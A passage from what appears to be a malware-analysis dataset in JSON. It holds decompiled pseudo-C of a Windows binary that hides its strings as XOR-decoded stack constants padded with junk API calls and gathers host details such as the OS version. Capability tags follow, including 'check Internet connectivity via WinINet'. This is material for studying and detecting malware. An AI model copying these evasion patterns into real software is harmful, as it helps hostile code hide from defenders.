          sub.ntdll.dll_memset(iVar15, 0, 0x4d);\n                var_5ch = 0;\n                var_7ch = &var_30h - iVar15;\n                do {\n                    iVar10 = var_5ch;\n                    pcVar13 = iVar15 + var_5ch;\n                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar1 = *(&var_8h + iVar10 % 6);\n                    uVar2 = pcVar13[var_7ch];\n                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    iVar4 = lpString;\n                    iVar10 = var_78h;\n                    var_5ch = var_5ch + 1;\n                    *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n                } while (var_5ch < 0x26);\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, iVar15, var_78h);\n                uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4, 0x10000000);\n                (*var_64h)(var_60h, iVar4, uVar8);\n                uVar11 = 0;\n                do {\n                    *(iVar15 + uVar11) = *(iVar15 + uVar11) + '\\t';\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < 0x4d);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar15);\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n            }\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n        if (iVar10 != 0) {\n            var_58h = 0x79463037;\n            var_54h._0_2_ = 0x6f2a;\n            var_54h._2_1_ = 99;\n            var_54h._3_1_ = 0x6b;\n            var_50h = 0x300a652f;\n            var_4ch = 0x6f167919;\n            var_48h._0_1_ = 0x59;\n            stack0xffffffb6 = 0x30016516;\n            var_42h = 0x7951;\n            var_40h._0_2_ = 0x6f45;\n            var_40h._2_1_ = 0x15;\n            var_3ch = 0x3041651d;\n            var_38h = 0x6f01794e;\n            var_34h._0_1_ = 0x1e;\n            var_34h._2_2_ = 0x655c;\n            var_30h._0_2_ = 0x300b;\n            var_30h._2_2_ = 30999;\n            var_2ch._0_1_ = 0x40;\n            var_2ch._1_1_ = 0x6f;\n            var_2ch._2_1_ = 0x43;\n            var_28h = 0x304a6559;\n            var_24h = 0x6f4b790f;\n            var_20h._0_1_ = 0x15;\n            var_20h._2_2_ = 0x651d;\n            var_1ch._0_1_ = 0x13;\n            var_1ch._1_1_ = 0x30;\n            var_1ch._2_2_ = 0x794e;\n            var_18h._0_1_ = 1;\n            var_18h._1_1_ = 0x6f;\n            var_18h._2_1_ = 0x4c;\n            var_14h = 0x30176549;\n            var_10h._0_1_ = 0x4e;\n            var_10h._1_2_ = 0x1579;\n            var_10h._3_1_ = 0x6f;\n            var_ch._0_1_ = 0x30;\n            var_8h._0_2_ = 0x306f;\n            var_8h._3_1_ = 0x79;\n            var_4h._0_1_ = 0x65;\n            var_48h._1_1_ = var_54h._3_1_;\n            var_40h._3_1_ = var_54h._3_1_;\n            var_34h._1_1_ = var_54h._3_1_;\n            var_2ch._3_1_ = var_54h._3_1_;\n            var_20h._1_1_ = var_54h._3_1_;\n            var_18h._3_1_ = var_54h._3_1_;\n            var_ch._1_1_ = var_54h._3_1_;\n            var_8h._2_1_ = var_54h._3_1_;\n            uVar8 = (*pcVar12)(8, 0x9d);\n            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n            uVar11 = 0;\n            do {\n                *(iVar10 + uVar11) = *(iVar10 + uVar11) + '3';\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x9d);\n            sub.ntdll.dll_memset(iVar10, 0, 0x9d);\n            var_5ch = 0;\n            var_7ch = &var_58h - iVar10;\n            do {\n                iVar15 = var_5ch;\n                pcVar13 = var_5ch + iVar10;\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar1 = *(&var_8h + iVar15 % 5);\n                uVar2 = pcVar13[var_7ch];\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar15 = lpString;\n                var_5ch = var_5ch + 1;\n                *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n            } while (var_5ch < 0x4e);\n            (*_sym.imp.USER32.dll_wsprintfW)\n                      (lpString, iVar10, var_1b4h, var_1b0h, var_1ach, &var_1a4h, var_a4h, var_a2h, var_a0h._2_1_, \n                       var_a0h);\n            uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar15, 0x10000000);\n            (*var_64h)(var_60h, iVar15, uVar8);\n            uVar11 = 0;\n            do {\n                *(iVar10 + uVar11) = *(iVar10 + uVar11) * -0x3b;\n                pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar11 = uVar11 + 1;\n            } while (uVar11 < 0x9d);\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        }\n        var_28h = 0x477f7128;\n        var_24h = 0x71153307;\n        var_20h._0_1_ = 0x3c;\n        var_20h._1_1_ = 0x47;\n        var_20h._2_2_ = 0x3335;\n        var_1ch._0_1_ = 0x1f;\n        var_1ch._1_1_ = 0x71;\n        var_1ch._2_2_ = 0x4720;\n        var_18h._0_1_ = 0x18;\n        var_18h._1_1_ = 0x33;\n        var_18h._2_1_ = 0x14;\n        var_18h._3_1_ = 0x71;\n        var_14h = 0x33714768;\n        var_10h._0_1_ = 0x55;\n        var_10h._1_2_ = 0x3671;\n        var_10h._3_1_ = 0x47;\n        var_ch._0_1_ = 0x51;\n        var_ch._1_1_ = 0x33;\n        var_8h._0_2_ = 0x7170;\n        var_8h._2_1_ = 0x52;\n        var_8h._3_1_ = 0x47;\n        var_4h._0_1_ = 0x51;\n        var_4h._1_1_ = 0x33;\n        uVar8 = (*pcVar12)(8, 0x3d);\n        iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) + -0x30;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x3d);\n        sub.ntdll.dll_memset(iVar10, 0, 0x3d);\n        var_5ch = 0;\n        var_7ch = &var_28h - iVar10;\n        do {\n            iVar15 = var_5ch;\n            pcVar13 = var_5ch + iVar10;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + iVar15 % 6);\n            uVar2 = pcVar13[var_7ch];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar15 = lpString;\n            var_5ch = var_5ch + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n        } while (var_5ch < 0x1e);\n        (*_sym.imp.USER32.dll_wsprintfW)(lpString, iVar10, *0x426260);\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar15, 0x10000000);\n        (*var_64h)(var_60h, iVar15, uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) ^ 0xb;\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x3d);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n        var_34h._0_1_ = 0x31;\n        var_34h._1_1_ = 0x36;\n        var_34h._2_2_ = 0x4c77;\n        var_30h._0_2_ = 0x6971;\n        var_30h._2_2_ = 0x5a45;\n        var_2ch._0_1_ = 0x18;\n        var_2ch._1_1_ = 0x38;\n        var_2ch._2_1_ = 0x1b;\n        var_2ch._3_1_ = 0x36;\n        var_28h = 0x694b4c2f;\n        var_24h = 0x38295a42;\n        var_20h._0_1_ = 0xd;\n        var_20h._1_1_ = 0x36;\n        var_20h._2_2_ = 0x4c19;\n        var_1ch._0_1_ = 0x57;\n        var_1ch._1_1_ = 0x69;\n        var_1ch._2_2_ = 0x5a5b;\n        var_18h._0_1_ = 0x3c;\n        var_18h._1_1_ = 0x38;\n        var_18h._2_1_ = 0x53;\n        var_18h._3_1_ = 0x36;\n        var_14h = 0x691d4c7a;\n        var_10h._0_1_ = 0x52;\n        var_10h._1_2_ = 0x4c5a;\n        var_10h._3_1_ = 0x38;\n        var_8h._0_2_ = 0x3669;\n        var_8h._2_1_ = 0x5a;\n        var_8h._3_1_ = 0x4c;\n        var_4h._0_1_ = 0x38;\n        uVar8 = (*pcVar12)(8, 0x51);\n        iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) + -0x2d;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x51);\n        sub.ntdll.dll_memset(iVar10, 0, 0x51);\n        var_5ch = 0;\n        var_7ch = &var_34h - iVar10;\n        do {\n            iVar15 = var_5ch;\n            pcVar13 = var_5ch + iVar10;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + iVar15 % 5);\n            uVar2 = pcVar13[var_7ch];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_5ch = var_5ch + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n        } while (var_5ch < 0x28);\n        uVar8 = fcn.00406cce();\n        iVar15 = lpString;\n        (*_sym.imp.USER32.dll_wsprintfW)(lpString, iVar10, uVar8);\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar15, 0x10000000);\n        (*var_64h)(var_60h, iVar15, uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) + -0x7d;\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x51);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n        uVar8 = (*pcVar12)(0, iVar15);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uVar11 = 0;\n        do {\n            *(var_88h + uVar11) = *(var_88h + uVar11) + -0x12;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x41);\n        uVar8 = (*pcVar12)(0, var_88h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    if (var_68h == 0) {\n        var_38h = 0x66456461;\n        var_34h._0_1_ = 0x79;\n        var_34h._1_1_ = 0x39;\n        var_34h._2_2_ = 0x6830;\n        var_30h._0_2_ = 0x3132;\n        var_30h._2_2_ = 0x6469;\n        var_2ch._0_1_ = 0x45;\n        var_2ch._1_1_ = 0x66;\n        var_2ch._2_1_ = 0x70;\n        var_2ch._3_1_ = 0x39;\n        var_28h = 0x31036803;\n        var_24h = 0x661c6457;\n        var_20h._0_1_ = 0xb;\n        var_20h._1_1_ = 0x39;\n        var_20h._2_2_ = 0x6844;\n        var_1ch._0_1_ = 0x31;\n        var_1ch._1_1_ = 0x31;\n        var_1ch._2_2_ = 0x6470;\n        var_18h._0_1_ = 0x26;\n        var_18h._1_1_ = 0x66;\n        var_18h._2_1_ = 0x79;\n        var_18h._3_1_ = 0x39;\n        var_14h = 0x31326830;\n        var_10h._0_1_ = 0x69;\n        var_10h._1_2_ = 0x6864;\n        var_10h._3_1_ = 0x66;\n        var_8h._0_2_ = 0x6439;\n        var_8h._2_1_ = 0x68;\n        var_8h._3_1_ = 0x66;\n        var_4h._0_1_ = 0x31;\n        uVar8 = (*pcVar12)(8, 0x59);\n        iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) + 'C';\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x59);\n        sub.ntdll.dll_memset(iVar10, 0, 0x59);\n        var_5ch = 0;\n        var_68h = &var_38h - iVar10;\n        do {\n            iVar15 = var_5ch;\n            pcVar13 = var_5ch + iVar10;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + iVar15 % 5);\n            uVar2 = pcVar13[var_68h];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_5ch = var_5ch + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n        } while (var_5ch < 0x2c);\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10, 0x10000000);\n        (*var_64h)(var_60h, iVar10, uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) ^ 0x40;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x59);\n    }\n    else {\n        var_38h = 0x43616760;\n        var_34h._0_1_ = 0x1f;\n        var_34h._1_1_ = 0x6a;\n        var_34h._2_2_ = 0x676c;\n        var_30h._0_2_ = 0x4318;\n        var_30h._2_2_ = 0x6a07;\n        var_2ch._0_1_ = 0x15;\n        var_2ch._1_1_ = 0x67;\n        var_2ch._2_1_ = 0xd;\n        var_2ch._3_1_ = 0x43;\n        var_28h = 0x675d6a30;\n        var_24h = 0x6a234322;\n        var_20h._0_1_ = 2;\n        var_20h._1_1_ = 0x67;\n        var_20h._2_2_ = 0x436c;\n        var_1ch._0_1_ = 0;\n        var_1ch._1_1_ = 0x6a;\n        var_1ch._2_2_ = 0x6771;\n        var_18h._0_1_ = 2;\n        var_18h._1_1_ = 0x43;\n        var_18h._2_1_ = 0x1e;\n        var_18h._3_1_ = 0x6a;\n        var_14h = 0x43096776;\n        var_10h._0_1_ = 3;\n        var_10h._1_2_ = 0x386a;\n        var_10h._3_1_ = 0x67;\n        var_8h._0_2_ = 0x6738;\n        var_8h._2_1_ = 0x4c;\n        var_8h._3_1_ = 0x43;\n        var_4h._0_1_ = 0x57;\n        var_4h._1_1_ = 0x6a;\n        uVar8 = (*pcVar12)(8, 0x59);\n        iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) * -0x14;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x59);\n        sub.ntdll.dll_memset(iVar10, 0, 0x59);\n        var_5ch = 0;\n        var_68h = &var_38h - iVar10;\n        do {\n            iVar15 = var_5ch;\n            pcVar13 = var_5ch + iVar10;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + iVar15 % 6);\n            uVar2 = pcVar13[var_68h];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_5ch = var_5ch + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n        } while (var_5ch < 0x2c);\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10, 0x10000000);\n        (*var_64h)(var_60h, iVar10, uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) + -0x6f;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x59);\n    }\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n    var_38h = 0x5a784c39;\n    var_34h._0_1_ = 0x17;\n    var_34h._1_1_ = 0x6e;\n    var_34h._2_2_ = 0x4c13;\n    var_30h._0_2_ = 0x5a3a;\n    var_30h._2_2_ = 0x6e3f;\n    var_2ch._0_1_ = 0x18;\n    var_2ch._1_1_ = 0x4c;\n    var_2ch._2_1_ = 0x78;\n    var_2ch._3_1_ = 0x5a;\n    var_28h = 0x4c136e17;\n    var_24h = 0x6e345a30;\n    var_20h._0_1_ = 4;\n    var_20h._1_1_ = 0x4c;\n    var_20h._2_2_ = 0x5a3b;\n    var_1ch._0_1_ = 0x33;\n    var_1ch._1_1_ = 0x6e;\n    var_1ch._2_2_ = 0x4c5b;\n    var_18h._0_1_ = 0x75;\n    var_18h._1_1_ = 0x5a;\n    var_18h._2_1_ = 0x13;\n    var_18h._3_1_ = 0x6e;\n    var_14h = 0x5a004c33;\n    var_10h._0_1_ = 2;\n    var_10h._1_2_ = 0x616e;\n    var_10h._3_1_ = 0x4c;\n    var_8h._0_2_ = 0x4c61;\n    var_8h._2_1_ = 0x55;\n    var_8h._3_1_ = 0x5a;\n    var_4h._0_1_ = 0x47;\n    var_4h._1_1_ = 0x6e;\n    fcn.0040649c(extraout_ECX);\n    iVar10 = 0;\n    var_68h = &var_38h - var_8ch;\n    do {\n        pcVar13 = iVar10 + var_8ch;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = *(&var_8h + iVar10 % 6);\n        uVar2 = pcVar13[var_68h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar10 = iVar10 + 1;\n        *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n    } while (iVar10 < 0x2c);\n    var_38h = 0x597d6d1e;\n    var_34h._0_1_ = 0x35;\n    var_34h._1_1_ = 0x46;\n    var_34h._2_2_ = 0x501f;\n    var_30h._0_2_ = 0x6536;\n    var_30h._2_2_ = 0x6d3e;\n    var_2ch._0_1_ = 0x29;\n    var_2ch._1_1_ = 0x59;\n    var_2ch._2_1_ = 0x48;\n    var_2ch._3_1_ = 0x46;\n    var_28h = 0x652b503d;\n    var_24h = 0x59236d23;\n    var_20h._0_1_ = 0;\n    var_20h._1_1_ = 0x46;\n    var_20h._2_2_ = 0x5003;\n    var_1ch._0_1_ = 0x2d;\n    var_1ch._1_1_ = 0x65;\n    var_1ch._2_2_ = 0x6d7c;\n    var_18h._0_1_ = 0x70;\n    var_18h._1_1_ = 0x59;\n    var_18h._2_1_ = 0x23;\n    var_18h._3_1_ = 0x46;\n    var_14h = 0x6515502c;\n    var_10h._0_1_ = 0x15;\n    var_10h._1_2_ = 0x156d;\n    var_10h._3_1_ = 0x59;\n    var_ch._0_1_ = 0x65;\n    var_ch._1_1_ = 0x46;\n    var_8h._0_2_ = 0x6d46;\n    var_8h._2_1_ = 0x50;\n    var_8h._3_1_ = 0x59;\n    var_4h._0_1_ = 0x65;\n    fcn.00406517(var_8ch);\n    iVar10 = 0;\n    var_68h = &var_38h - var_7ch;\n    do {\n        pcVar13 = iVar10 + var_7ch;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = *(&var_8h + iVar10 % 5);\n        uVar2 = pcVar13[var_68h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar10 = iVar10 + 1;\n        *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n    } while (iVar10 < 0x2e);\n    var_30h._0_2_ = 0x4b6c;\n    var_30h._2_2_ = 0x6848;\n    var_2ch._0_1_ = 0x3c;\n    var_2ch._1_1_ = 0x70;\n    var_2ch._2_1_ = 0x46;\n    var_2ch._3_1_ = 0x4b;\n    var_28h = 0x7014680a;\n    var_24h = 0x68484b4d;\n    var_20h._0_1_ = 0x39;\n    var_20h._1_1_ = 0x70;\n    var_20h._2_2_ = 0x4b47;\n    var_1ch._0_1_ = 0;\n    var_1ch._1_1_ = 0x68;\n    var_1ch._2_2_ = 0x7008;\n    var_18h._0_1_ = 0xe;\n    var_18h._1_1_ = 0x4b;\n    var_18h._2_1_ = 0x45;\n    var_18h._3_1_ = 0x68;\n    var_14h = 0x4b667038;\n    var_10h._0_1_ = 0x30;\n    var_10h._1_2_ = 0x2968;\n    var_10h._3_1_ = 0x70;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x4b;\n    var_8h._0_2_ = 0x4b34;\n    var_8h._2_1_ = 0x65;\n    var_8h._3_1_ = 0x68;\n    var_4h._0_1_ = 0x6c;\n    var_4h._1_1_ = 0x70;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n    uVar11 = 0;\n    do {\n        *(iVar10 + uVar11) = *(iVar10 + uVar11) * '\\n';\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 0x4d);\n    var_78h = iVar10;\n    sub.ntdll.dll_memset(iVar10, 0, 0x4d);\n    var_5ch = 0;\n    var_68h = &var_30h - iVar10;\n    do {\n        iVar15 = var_5ch;\n        pcVar13 = var_5ch + iVar10;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = *(&var_8h + iVar15 % 6);\n        uVar2 = pcVar13[var_68h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_5ch = var_5ch + 1;\n        *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n    } while (var_5ch < 0x26);\n    var_34h._0_1_ = 0x20;\n    var_34h._1_1_ = 0x79;\n    var_34h._2_2_ = 0x3248;\n    var_30h._0_2_ = 0x7807;\n    var_30h._2_2_ = 0x650b;\n    var_2ch._0_1_ = 0x5d;\n    var_2ch._1_1_ = 0x57;\n    var_2ch._2_1_ = 0;\n    var_2ch._3_1_ = 0x79;\n    var_28h = 0x787a321c;\n    var_24h = 0x5741652c;\n    var_20h._0_1_ = 0x1d;\n    var_20h._1_1_ = 0x79;\n    var_20h._2_2_ = 0x3201;\n    var_1ch._0_1_ = 0x6d;\n    var_1ch._1_1_ = 0x78;\n    var_1ch._2_2_ = 0x6559;\n    var_18h._0_1_ = 0x74;\n    var_18h._1_1_ = 0x57;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x79;\n    var_14h = 0x78043229;\n    var_10h._0_1_ = 0x3c;\n    var_10h._1_2_ = 0x3265;\n    var_10h._3_1_ = 0x57;\n    var_8h._0_2_ = 0x7978;\n    var_8h._2_1_ = 0x65;\n    var_8h._3_1_ = 0x32;\n    var_4h._0_1_ = 0x57;\n    fcn.00406592(extraout_ECX_00);\n    iVar10 = 0;\n    var_68h = &var_34h - nSize;\n    do {\n        pcVar13 = iVar10 + nSize;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = *(&var_8h + iVar10 % 5);\n        uVar2 = pcVar13[var_68h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar10 = iVar10 + 1;\n        *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n    } while (iVar10 < 0x28);\n    if (arg_8h == 0) {\n        var_8ch = var_7ch;\n    }\n    uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_8ch, 0x10000000);\n    pcVar12 = var_64h;\n    (*var_64h)(var_60h, var_8ch, uVar8);\n    iVar15 = var_78h;\n    iVar10 = nSize;\n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(nSize, 0x10000000);\n    }\n    else {\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_78h, 0x10000000);\n        iVar10 = iVar15;\n    }\n    (*pcVar12)(var_60h, iVar10, uVar8);\n    iVar10 = fcn.0040dc26();\n    if (iVar10 == 0) {\n        var_40h._0_2_ = 0x523e;\n        var_40h._2_1_ = 0x5c;\n        var_40h._3_1_ = 0x30;\n        var_3ch = 0x52146338;\n        var_38h = 0x6310301e;\n        var_34h._0_1_ = 0x1f;\n        var_34h._1_1_ = 0x52;\n        var_34h._2_2_ = 0x305c;\n        var_30h._0_2_ = 0x6329;\n        var_30h._2_2_ = 0x5213;\n        var_2ch._0_1_ = 5;\n        var_2ch._1_1_ = 0x30;\n        var_2ch._2_1_ = 7;\n        var_2ch._3_1_ = 99;\n        var_28h = 0x30145222;\n        var_24h = 0x5203631c;\n        var_20h._0_1_ = 0x12;\n        var_20h._1_1_ = 0x30;\n        var_20h._2_2_ = 0x631c;\n        var_1ch._0_1_ = 0x5c;\n        var_1ch._1_1_ = 0x52;\n        var_1ch._2_2_ = 0x3051;\n        var_18h._0_1_ = 0x2e;\n        var_18h._1_1_ = 99;\n        var_18h._2_1_ = 0x27;\n        var_18h._3_1_ = 0x52;\n        var_14h = 0x633b303d;\n        var_10h._0_1_ = 0x23;\n        var_10h._1_2_ = 0x7152;\n        var_10h._3_1_ = 0x30;\n        var_8h._0_2_ = 0x5266;\n        var_8h._2_1_ = 0x71;\n        var_8h._3_1_ = 0x30;\n        var_4h._0_1_ = 0x68;\n        var_4h._1_1_ = 99;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) * 'k';\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x69);\n        sub.ntdll.dll_memset(iVar10, 0, 0x69);\n        arg_8h = 0;\n        do {\n            pcVar13 = iVar10 + arg_8h;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + arg_8h % 6);\n            uVar2 = pcVar13[&var_40h - iVar10];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            arg_8h = arg_8h + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n        } while (arg_8h < 0x34);\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10, 0x10000000);\n        (*var_64h)(var_60h, iVar10, uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) ^ 0x1f;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x69);\n    }\n    else {\n        var_3ch = 0x52575011;\n        var_38h = 0x503b4c07;\n        var_34h._0_1_ = 0x15;\n        var_34h._1_1_ = 0x52;\n        var_34h._2_2_ = 0x4c2f;\n        var_30h._0_2_ = 0x5030;\n        var_30h._2_2_ = 0x5257;\n        var_2ch._0_1_ = 0x16;\n        var_2ch._1_1_ = 0x4c;\n        var_2ch._2_1_ = 0x3c;\n        var_2ch._3_1_ = 0x50;\n        var_28h = 0x4c38520e;\n        var_24h = 0x521f500d;\n        var_20h._0_1_ = 0x23;\n        var_20h._1_1_ = 0x4c;\n        var_20h._2_2_ = 0x502c;\n        var_1ch._0_1_ = 0x19;\n        var_1ch._1_1_ = 0x52;\n        var_1ch._2_2_ = 0x4c23;\n        var_18h._0_1_ = 0x73;\n        var_18h._1_1_ = 0x50;\n        var_18h._2_1_ = 0x5a;\n        var_18h._3_1_ = 0x52;\n        var_14h = 0x501b4c03;\n        var_10h._0_1_ = 0x2f;\n        var_10h._1_2_ = 0x1252;\n        var_10h._3_1_ = 0x4c;\n        var_ch._0_1_ = 0x49;\n        var_ch._1_1_ = 0x50;\n        var_8h._0_2_ = 0x5049;\n        var_8h._2_1_ = 0x7a;\n        var_8h._3_1_ = 0x52;\n        var_4h._0_1_ = 0x57;\n        var_4h._1_1_ = 0x4c;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x65);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) ^ 0xdc;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x65);\n        sub.ntdll.dll_memset(iVar10, 0, 0x65);\n        arg_8h = 0;\n        do {\n            pcVar13 = iVar10 + arg_8h;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar1 = *(&var_8h + arg_8h % 6);\n            uVar2 = pcVar13[&var_3ch - iVar10];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            arg_8h = arg_8h + 1;\n            *pcVar13 = cVar7 + ((uVar1 ^ uVar2) - cVar6);\n        } while (arg_8h < 0x32);\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar10, 0x10000000);\n        (*var_64h)(var_60h, iVar10, uVar8);\n        uVar11 = 0;\n        do {\n            *(iVar10 + uVar11) = *(iVar10 + uVar11) * -0xc;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0x65);\n    }\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    fcn.00406561();\n    uVar11 = 0;\n    do {\n        *(var_78h + uVar11) = *(var_78h + uVar11) * -0x23;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 0x4d);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_78h);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n    fcn.004064e6();\n    fcn.00406477();\n    return;\n}\n",
        "token_count": 15992
    },
    "00404e2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
